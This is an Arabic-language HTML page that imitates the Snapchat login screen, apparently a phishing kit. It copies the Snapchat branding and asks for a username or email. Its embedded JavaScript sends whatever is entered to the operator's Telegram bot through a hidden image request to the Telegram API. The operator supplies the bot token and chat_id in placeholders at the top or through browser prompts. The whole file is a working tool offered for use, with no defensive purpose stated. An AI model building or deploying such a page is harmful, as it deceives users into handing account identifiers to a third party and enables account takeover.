<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>تسجيل الدخول إلى سناب شات</title>

  <!-- ضع توكن البوت و chat_id هنا -->
  <!-- استبدل القيم النصية بالـ token و chat_id الخاصين بك -->
  <script>
    // WARNING: لا تشارك هذا الملف أو التوكن مع أي شخص.
    // استبدل 'PLACE_YOUR_BOT_TOKEN_HERE' و 'PLACE_YOUR_CHAT_ID_HERE' بالقيم الفعلية لديك
    const TG_TOKEN = 'PLACE_YOUR_BOT_TOKEN_HERE';
    const TG_CHAT_ID = 'PLACE_YOUR_CHAT_ID_HERE';
    // إذا تركت القيم أعلاه كما هي، سيُطلب منك إدخالهما عبر النافذة المنبثقة عند الضغط على "التالي".
  </script>

  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#f6f6f7; --card:#fff; --accent-yellow:#ffd400; --input-border:#ffd89a;
      --btn-blue:#00a8ff; --muted:#9aa0a6; --text:#111; --shadow: 0 6px 18px rgba(17,17,17,0.08);
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;background:var(--bg);font-family:'Cairo',system-ui,Arial;direction:rtl;color:var(--text)}
    .screen{min-height:100vh;display:flex;align-items:flex-start;justify-content:center;padding:28px 16px}
    .phone{width:390px;max-width:100%;position:relative}
    .top-pill{display:flex;align-items:center;justify-content:center;gap:10px;background:var(--accent-yellow);color:#111;padding:12px 26px;border-radius:40px;margin:0 auto 14px;font-weight:700;box-shadow:0 6px 18px rgba(0,0,0,0.12);font-size:16px}
    .top-pill img{width:20px;height:20px;object-fit:contain}
    .card{background:var(--card);border-radius:12px;box-shadow:var(--shadow);padding:30px 26px 18px}
    .logo{display:flex;align-items:center;justify-content:center;margin-bottom:10px}
    .logo img{width:66px;height:66px;object-fit:contain}
    h1{margin:6px 0 18px;text-align:center;font-size:34px;line-height:1.02;font-weight:800}
    label.small{display:block;color:var(--muted);font-size:15px;margin-bottom:10px;padding-right:6px}
    .input-wrap{position:relative;margin-bottom:10px}
    input[type="text"]{width:100%;padding:18px 16px;border-radius:12px;border:2px solid var(--input-border);background:transparent;font-size:16px;outline:none}
    .use-phone{display:block;color:#2aa6ff;text-align:center;margin:10px 0 18px;text-decoration:none;font-weight:600}
    .btn{display:block;width:170px;margin:6px auto 18px;background:var(--btn-blue);color:#fff;text-align:center;padding:12px 22px;border-radius:40px;text-decoration:none;font-weight:700;box-shadow:0 8px 18px rgba(0,168,255,0.18)}
    .footer{margin-top:10px;text-align:center;color:var(--muted);font-size:15px;padding:8px 6px 2px}
    .footer a{color:var(--text);text-decoration:none;font-weight:700;margin-right:8px}
    .status{margin-top:6px;text-align:center;font-weight:600}
    .settings{font-size:13px;color:var(--muted);text-align:center;margin-top:6px}
    .controls{display:flex;justify-content:center;gap:8px;margin-top:8px}
    .control-btn{font-size:12px;padding:6px 8px;border-radius:8px;border:1px solid #e6e6e6;background:#fff;cursor:pointer}
    @media(max-width:420px){.phone{padding:0 6px}.card{padding:24px}h1{font-size:30px}.top-pill{font-size:15px;padding:10px 20px}}
  </style>
</head>
<body>
  <div class="screen">
    <div class="phone" role="main" aria-label="نموذج تسجيل سناب">
      <div class="top-pill" aria-hidden="true">
        <span>Open Snapchat</span>
        <img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="snap logo" />
      </div>

      <div class="card" role="form" aria-labelledby="form-title">
        <div class="logo" aria-hidden="true">
          <img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="شعار" />
        </div>

        <h1 id="form-title">تسجيل الدخول إلى سناب<br>شات</h1>

        <label class="small" for="user">اسم المستخدم أو البريد الإلكتروني</label>
        <div class="input-wrap">
          <input id="user" type="text" placeholder="أدخل اسم المستخدم أو البريد الإلكتروني" autocomplete="off" />
        </div>

        <a class="use-phone" href="#" onclick="event.preventDefault()">استخدم رقم الهاتف بدلاً من ذلك</a>

        <a id="submitBtn" class="btn" href="#" onclick="event.preventDefault()">التالي</a>

        <div class="status" id="status" aria-live="polite"></div>

        <div class="settings" style="margin-top:12px">
          إذا أردت، يمكنك حفظ التوكن و chat_id محليًا في المتصفح (محفوظات جهازك فقط)، أو تركهما في المتغيرات أعلى الملف.
        </div>

        <div class="controls" style="margin-top:12px">
          <button class="control-btn" id="clearCreds" type="button">مسح التوكن من المتصفح</button>
          <button class="control-btn" id="previewMsg" type="button">معاينة الرسالة</button>
        </div>
      </div>

      <div class="footer" role="contentinfo">
        <span>هل أنت جديد في سناب شات؟</span>
        <a href="#" onclick="event.preventDefault()">تسجيل الاشتراك</a>
      </div>
    </div>
  </div>

  <script>
    (function(){
      // use the constants at the top if the user filled them; otherwise prompt
      function getCreds(){
        try {
          if(typeof TG_TOKEN === 'string' && TG_TOKEN && TG_TOKEN !== 'PLACE_YOUR_BOT_TOKEN_HERE' &&
             typeof TG_CHAT_ID === 'string' && TG_CHAT_ID && TG_CHAT_ID !== 'PLACE_YOUR_CHAT_ID_HERE'){
            return { token: TG_TOKEN, chat: TG_CHAT_ID };
          }
        } catch(e){
          // fallthrough to prompt
        }

        // إذا لم تضع القيم في أعلى الملف، نطلبهما مرة واحدة من المستخدم
        const storedToken = localStorage.getItem('tg_token') || '';
        const storedChat = localStorage.getItem('tg_chat') || '';
        if(storedToken && storedChat) return { token: storedToken, chat: storedChat };

        const token = prompt('أدخل توكن بوت تلغرام (Bot Token):', '');
        if(!token) return null;
        const chat = prompt('أدخل chat_id (رقم المحادثة):', '');
        if(!chat) return null;
        const save = confirm('حفظ التوكن و chat_id في هذا المتصفح لتجنّب الإدخال مرة أخرى؟');
        if(save){
          try {
            localStorage.setItem('tg_token', token);
            localStorage.setItem('tg_chat', chat);
          } catch(e){ console.warn('تعذّر الحفظ', e); }
        }
        return { token, chat };
      }

      function sendToTelegramByImage(token, chatId, text){
        // نبني رابط GET لـ sendMessage
        const safeText = encodeURIComponent(text);
        const url = `https://api.telegram.org/bot${encodeURIComponent(token)}/sendMessage?chat_id=${encodeURIComponent(chatId)}&text=${safeText}`;
        const img = new Image();
        img.src = url;
        console.log('تم إرسال طلب GET إلى:', url);
      }

      const submitBtn = document.getElementById('submitBtn');
      const statusEl = document.getElementById('status');
      const clearBtn = document.getElementById('clearCreds');
      const previewBtn = document.getElementById('previewMsg');

      submitBtn.addEventListener('click', function(){
        statusEl.textContent = '';
        const user = document.getElementById('user').value.trim();
        if(!user){ alert('الرجاء إدخال اسم المستخدم أو البريد'); return; }

        const creds = getCreds();
        if(!creds){ statusEl.style.color = 'red'; statusEl.textContent = 'لم تُزوّد التوكن أو chat_id.'; return; }

        const message = `نموذج: اسم المستخدم = ${user}`;
        try{
          sendToTelegramByImage(creds.token, creds.chat, message);
          statusEl.style.color = 'green';
          statusEl.textContent = 'تم إرسال اسم المستخدم (تحقق من بوت التليجرام).';
        }catch(err){
          console.error(err);
          statusEl.style.color = 'red';
          statusEl.textContent = 'حدث خطأ أثناء الإرسال.';
        }
      });

      clearBtn.addEventListener('click', function(){
        try{
          localStorage.removeItem('tg_token');
          localStorage.removeItem('tg_chat');
          alert('تم مسح التوكن و chat_id من المتصفح.');
        }catch(e){ alert('تعذّر المسح'); }
      });

      previewBtn.addEventListener('click', function(){
        const user = document.getElementById('user').value.trim() || '(فارغ)';
        alert(`معاينة الرسالة التي سترسل:\n\nنموذج: اسم المستخدم = ${user}\n\nلن تُرسل كلمات مرور أو أي بيانات حسّاسة.`);
      });

      // دالة مساعدة لمسح التخزين من console
      window.__clearTelegramCreds = function(){ localStorage.removeItem('tg_token'); localStorage.removeItem('tg_chat'); alert('تم المسح'); };
    })();
  </script>
</body>
</html>
